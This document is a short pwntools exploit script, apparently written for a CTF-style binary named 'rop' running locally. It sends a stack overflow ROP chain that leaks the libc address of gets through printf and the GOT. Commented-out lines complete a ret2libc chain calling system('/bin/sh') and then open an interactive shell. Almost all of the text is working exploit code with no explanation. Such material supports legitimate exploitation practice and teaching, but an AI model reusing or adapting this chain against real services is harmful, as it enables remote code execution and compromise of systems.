from pwn import *
#context.log_level = 'debug'

target = 'rop'
conn = remote('127.0.0.1',1234)

print 'gdb attach ' , pwnlib.util.proc.pidof(target)
raw_input("biubiubiu")

vuln_lop  = p64(0x400656)  # get a loop
data_addr = p64(0x6008F8)  # addr with write permission

payload = cyclic(72)
payload += p64(0x400763)	# pop rdi , ret
payload += data_addr		# data
payload += p64(0x400540)	# gets(data)
payload += vuln_lop			# loop
conn.sendline(payload)
conn.recvuntil('\n')

conn.sendline("%s")			# printf payload

payload = cyclic(72)
payload += p64(0x400763)	# pop rdi , ret
payload += data_addr		# addr , rdi
payload += p64(0x400761)	# pop rsi ; pop r15 ; ret
payload += p64(0x00600B08)	# get.got.plt,rsi
payload += p64(0x0) 		# padding
payload += p64(0x400510)	# printf(addr , get.got.plt)
payload += vuln_lop
conn.sendline(payload)
conn.recvuntil('\n')

data = conn.recv(8)			# get addr
gets_addr = u64(data + '\x00'*(8-len(data)))	# libc-database
print gets_addr,data
# system_addr = gets_addr - 0x6b080 + 0x41490
# binsh_addr = gets_addr - 0x6b080 + 0x163428
# print 'get_addr' , 		hex(gets_addr)
# print 'system_addr',	hex(system_addr)
# print 'binsh_addr' , 	hex(binsh_addr)

# payload = cyclic(72)
# payload += p64(0x400763)	# pop rdi , ret
# payload += p64(binsh_addr)	# /bin/sh; addr,rdi
# payload += p64(system_addr)	# system(/bin/sh;)
# payload += p64(0xdeadbeaf)
# conn.sendline(payload)
# conn.recvuntil('\n')

# raw_input('interactive')
# conn.interactive()
